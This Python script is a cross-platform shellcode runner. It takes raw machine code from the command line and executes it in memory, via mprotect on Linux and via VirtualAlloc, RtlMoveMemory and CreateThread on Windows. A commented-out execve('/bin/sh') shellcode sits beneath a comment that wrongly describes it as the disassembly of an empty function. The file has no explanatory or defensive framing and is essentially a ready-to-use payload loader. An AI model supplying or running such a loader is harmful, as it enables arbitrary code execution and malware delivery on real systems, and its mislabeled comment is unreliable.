#!/usr/bin/python
import utils
import sys
import ctypes
import codecs

if sys.platform.startswith('linux'):
    from ctypes import *

    # Initialise ctypes prototype for mprotect().
    # According to the manpage:
    #     int mprotect(const void *addr, size_t len, int prot);
    libc = CDLL("libc.so.6")
    mprotect = libc.mprotect
    mprotect.restype = c_int
    mprotect.argtypes = [c_void_p, c_size_t, c_int]

    # PROT_xxxx constants
    # Output of gcc -E -dM -x c /usr/include/sys/mman.h | grep PROT_
    #     #define PROT_NONE 0x0
    #     #define PROT_READ 0x1
    #     #define PROT_WRITE 0x2
    #     #define PROT_EXEC 0x4
    #     #define PROT_GROWSDOWN 0x01000000
    #     #define PROT_GROWSUP 0x02000000
    PROT_NONE = 0x0
    PROT_READ = 0x1
    PROT_WRITE = 0x2
    PROT_EXEC = 0x4

    # Machine code of an empty C function, generated with gcc
    # Disassembly:
    #     55        push   %ebp
    #     89 e5     mov    %esp,%ebp
    #     5d        pop    %ebp
    #     c3        ret
    #code = "\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05"

    code = codecs.escape_decode(sys.argv[1])[0]

    # Get the address of the code
    addr = addressof(cast(c_char_p(code), POINTER(c_char)).contents)

    # Get the start of the page containing the code and set the permissions
    pagesize = 0x1000
    pagestart = addr & ~(pagesize - 1)
    if mprotect(pagestart, pagesize, PROT_READ|PROT_WRITE|PROT_EXEC):
        raise RuntimeError("Failed to set permissions using mprotect()")

    # Generate ctypes function object from code
    functype = CFUNCTYPE(None)
    f = functype(addr)

    # Call the function
    print("Calling f()")
    f()

elif sys.platform.startswith('win'):

    buf = codecs.escape_decode(sys.argv[1])[0]

    shellcode = bytearray(buf)
     
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(shellcode)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
     
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
     
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(shellcode)))
     
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
     
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
